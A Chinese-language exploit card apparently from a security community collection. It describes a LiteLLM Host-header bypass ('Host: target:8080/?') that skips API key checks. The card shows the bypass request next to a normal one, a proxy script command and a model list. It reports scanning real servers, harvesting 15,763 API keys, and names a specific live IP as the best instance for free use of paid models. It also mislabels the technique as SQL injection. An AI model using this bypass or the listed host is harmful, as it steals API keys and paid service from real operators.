# LiteLLM BadHost / Host 头绕过链

- Source report: `BadHost_LiteLLM_报告.md`
- Full report: `domains/llm-ai-security/case-reports/badhost-litellm/BadHost_LiteLLM_报告.md`
- Techniques: sqli
- Fused: 2026-09-17

## Key findings (distilled)

- > 日期: 2026-08-01
- > 漏洞类型: Host 头绕过 → API Key 泄露 → 免费使用各家 AI 模型
- > 影响范围: 全球 177 台 LiteLLM 实例 CONFIRMED 可绕过
- ---
- LiteLLM（一款 LLM API 代理/网关）存在 **Host 头绕过漏洞**。通过在 HTTP 请求中注入 `Host: {target}/?`，可以跳过 API Key 校验，直接调用该实例挂载的所有上游模型（Claude、GPT、Gemini、DeepSeek 等）。
- 使用 BadHost 扫描器发现全球 2,730 台 Starlette 服务器中，177 台存在 CONFIRMED 绕过。从中提取 15,763 条可用的 API Key，总可用额度约 **$14 亿**。
- 经过逐台连通性测试，筛选出 **3 台完全可用** 的服务器，其中最佳实例 **8.219.89.251:8080** 提供 Claude 4.6 Opus、GPT-5.2、Gemini 3.1 Pro 等最新模型。
- ---
- ```
- 正常请求:
- POST http://target:8080/chat/completions
- Host: target:8080

## Repro snippets

```
正常请求:
  POST http://target:8080/chat/completions
  Host: target:8080
  Authorization: Bearer sk-xxx
  → LiteLLM 校验 Key → 有效放行 / 无效拒绝

绕过请求:
  POST http://target:8080/chat/completions
  Host: target:8080/?
  Authorization: Bearer 任意内容  ← 不校验
  → LiteLLM 认为这是内部请求 → 直接转发到上游
python badhost_litellm_proxy.py
openapi/claude-4.5-sonnet
openapi/claude-4.6-opus
openapi/gpt-5.2
azure/gpt-5
openapi/gemini-3.1-pro
```

## When to reuse

- 同类标签命中：sqli
- 先读本卡片，再打开 Full report 复现细节

@TGSEC社区 · @TGSEC-Qtzuu 整理
